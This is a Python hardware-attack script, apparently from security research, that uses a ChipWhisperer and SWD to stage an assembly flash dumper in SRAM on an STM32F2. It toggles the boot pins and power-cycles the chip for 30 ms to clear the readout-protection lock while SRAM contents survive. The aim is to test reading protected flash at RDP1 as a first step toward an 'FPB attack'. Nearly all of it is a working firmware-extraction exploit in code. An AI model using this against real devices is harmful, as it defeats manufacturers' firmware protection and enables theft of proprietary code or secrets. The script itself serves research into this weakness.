#!/usr/bin/env python
"""h3_sramboot_test.py - does SRAM-booted code read flash at RDP1 on F2?

Minimal decisive test before the full FPB attack. Obermaier found that on the
F1, code booted from SRAM at RDP1 CANNOT read flash (hence his FPB trick). We
test that premise on our F2:

  1. stage a tiny dumper in SRAM via SWD (copies flash[0x08008000..+256] -> SRAM
     scratch 0x2000F000, writes a done-marker).
  2. set BOOT0=1 (TIO1) + BOOT1=1 (TIO2) = embedded-SRAM boot.
  3. quick power-cycle (~30 ms, inside the proven <=50 ms remanence window) ->
     clears the debug flash-lock; the staged SRAM survives.
  4. chip SRAM-boots and runs the dumper (no debugger attached).
  5. reconnect SWD, read the scratch + marker.

  scratch == real flash  -> SRAM-boot CAN read flash at RDP1 on F2 (attack is
                            trivial: just SRAM-boot a dumper, no FPB needed).
  scratch == sentinel/FF  -> flash inaccessible to SRAM-boot (as on F1) -> need
                            the FPB boot-from-flash trick.

Non-destructive: SRAM + boot pins + power only. No flash/option writes.
"""
import os, sys, time, glob, fcntl, struct, subprocess, tempfile
import chipwhisperer as cw
from swd.stlink import Stlink
from swd.cortexm import CortexM

SRAM      = 0x20000000
SCRATCH   = 0x2000F000
MARKER    = 0x2000EFFC
MARKER_VAL= 0xD09ED09E
ALIVE     = 0x2000EFF8
ALIVE_VAL = 0x1AA1AA1A
SENTINEL  = 0xBADDC0DE
NWORDS    = 64
OPTCR     = 0x40023C14
OFF_MS    = 30
HERE      = os.path.dirname(os.path.abspath(__file__))

ASM = r'''
    .syntax unified
    .cpu cortex-m3
    .thumb
    .global _start
_start:
    .word 0x20010000        @ vector[0] initial SP
    .word reset+1           @ vector[1] reset (thumb)
reset:
    ldr r0, =0x2000EFF8     @ ALIVE marker addr
    ldr r3, =0x1AA1AA1A     @ proof-of-life, written BEFORE touching flash
    str r3, [r0]
    ldr r0, =0x08008000     @ flash src
    ldr r1, =0x2000F000     @ sram scratch
    movs r2, #64            @ 64 words
copy:
    ldr r3, [r0]            @ <-- the flash read under test
    str r3, [r1]
    adds r0, r0, #4
    adds r1, r1, #4
    subs r2, r2, #1
    bne copy
    ldr r0, =0x2000EFFC
    ldr r3, =0xD09ED09E     @ done marker
    str r3, [r0]
spin:
    b spin
    .ltorg
'''


def build_blob():
    d = tempfile.mkdtemp(prefix='h3asm_')
    s, o, e, b = (os.path.join(d, f) for f in ('d.s','d.o','d.elf','d.bin'))
    open(s,'w').write(ASM)
    subprocess.run(['arm-none-eabi-as','-mcpu=cortex-m3','-mthumb','-o',o,s], check=True)
    subprocess.run(['arm-none-eabi-ld','-Ttext=0x20000000','-e','_start','-o',e,o], check=True)
    subprocess.run(['arm-none-eabi-objcopy','-O','binary',e,b], check=True)
    blob = open(b,'rb').read()
    return blob


def usbreset():
    RST=(ord('U')<<8)|20
    for d in glob.glob('/sys/bus/usb/devices/*'):
        try:
            if open(d+'/idVendor').read().strip()=='0483' and open(d+'/idProduct').read().strip()=='3748':
                bb=int(open(d+'/busnum').read()); n=int(open(d+'/devnum').read())
                fd=os.open(f'/dev/bus/usb/{bb:03d}/{n:03d}',os.O_WRONLY); fcntl.ioctl(fd,RST,0); os.close(fd); return
        except OSError: continue


def connect():
    for i in range(5):
        try: return Stlink(swd_frequency=1800000)
        except Exception: usbreset(); time.sleep(0.6)
    raise SystemExit('swd down')


def main():
    gt = open(os.path.join(HERE,'storage.bin'),'rb').read()
    blob = build_blob()
    print(f'[+] shellcode built: {len(blob)} bytes')

    s = cw.scope(); s.clock.clkgen_freq=16e6
    s.io.glitch_hp=False; s.io.glitch_lp=False
    s.io.tio1=False; s.io.tio2='high_z'; s.io.tio3='high_z'; s.io.tio4='high_z'
    s.io.target_pwr=False; time.sleep(0.5); s.io.target_pwr=True; time.sleep(1.0)
    st=connect(); cmx=CortexM(st)
    print(f'[+] IDCODE=0x{st.get_idcode():08x} RDP=0x{(st.get_mem32(OPTCR)>>8)&0xff:02x}')
    cmx.halt()

    # stage blob + pre-fill scratch with sentinel + clear marker
    print('[+] staging dumper + sentinel scratch')
    for i in range(0, len(blob), 4):
        st.set_mem32(SRAM+i, struct.unpack('<I', blob[i:i+4].ljust(4,b'\0'))[0])
    for w in range(NWORDS):
        st.set_mem32(SCRATCH + 4*w, SENTINEL)
    st.set_mem32(MARKER, 0)
    st.set_mem32(ALIVE, 0)
    # verify stage
    assert st.get_mem32(SRAM) == 0x20010000, 'vector[0] wrong'

    # set SRAM-boot pins: BOOT0=1 (TIO1), BOOT1=1 (TIO2)
    s.io.tio1 = True
    s.io.tio2 = True
    print('[+] BOOT0=1 (TIO1), BOOT1=1 (TIO2) -> SRAM-boot armed')

    # drop SWD, quick power-cycle inside remanence window
    try: st.__del__()
    except Exception: pass
    print(f'[+] power-cycle {OFF_MS} ms (clear lock, keep SRAM)')
    s.io.target_pwr=False; time.sleep(OFF_MS/1000.0); s.io.target_pwr=True
    time.sleep(0.4)                      # SRAM-boot + run the dumper (runs in <1 ms)

    # reconnect + read results
    st2=connect()
    alive = st2.get_mem32(ALIVE)
    mark = st2.get_mem32(MARKER)
    out = b''.join(struct.pack('<I', st2.get_mem32(SCRATCH+4*w)) for w in range(NWORDS))
    print(f'[+] ALIVE  = 0x{alive:08x} ({"SRAM-BOOT ENGAGED (code ran)" if alive==ALIVE_VAL else "code did NOT run"})')
    print(f'[+] marker = 0x{mark:08x} ({"RAN to completion" if mark==MARKER_VAL else "did NOT complete"})')
    print(f'    scratch head: {out[:16].hex()}')
    print(f'    flash truth : {gt[:16].hex()}')
    nsent = sum(1 for w in range(NWORDS)
                if struct.unpack('<I', out[4*w:4*w+4])[0] == SENTINEL)
    match = out[:256] == gt[:256]
    print(f'    scratch still-sentinel words: {nsent}/{NWORDS}')
    if match:
        print('\n[VERDICT] *** SRAM-BOOT READS FLASH on F2! *** attack is trivial - '
              'just SRAM-boot a dumper, no FPB needed.')
        rc=0
    elif mark==MARKER_VAL:
        print('\n[VERDICT] dumper RAN but flash came back wrong (blocked/FF/zero). '
              'SRAM-boot flash is inaccessible at RDP1 (as on F1) -> need the FPB '
              'boot-from-flash trick.')
        rc=1
    elif alive==ALIVE_VAL:
        print('\n[VERDICT] SRAM-BOOT ENGAGED (alive marker set) but the flash read '
              'FAULTED before any copy -> SRAM-boot cannot read flash at RDP1 (as on '
              'F1). Boot path WORKS; need the FPB boot-from-flash trick for flash access.')
        rc=1
    else:
        print('\n[VERDICT] code did NOT run (alive marker unset) -> SRAM-boot did not '
              'engage. BOOT0/BOOT1 not selecting SRAM boot - check BOOT1 (TIO2) wiring/'
              'drive, or a board pulldown fighting TIO2.')
        rc=2
    try: st2.__del__()
    except Exception: pass
    s.io.tio1=False; s.io.tio2='high_z'; s.io.target_pwr=False; s.dis()
    return rc


if __name__ == '__main__':
    try: sys.exit(main())
    except KeyboardInterrupt: sys.exit(1)
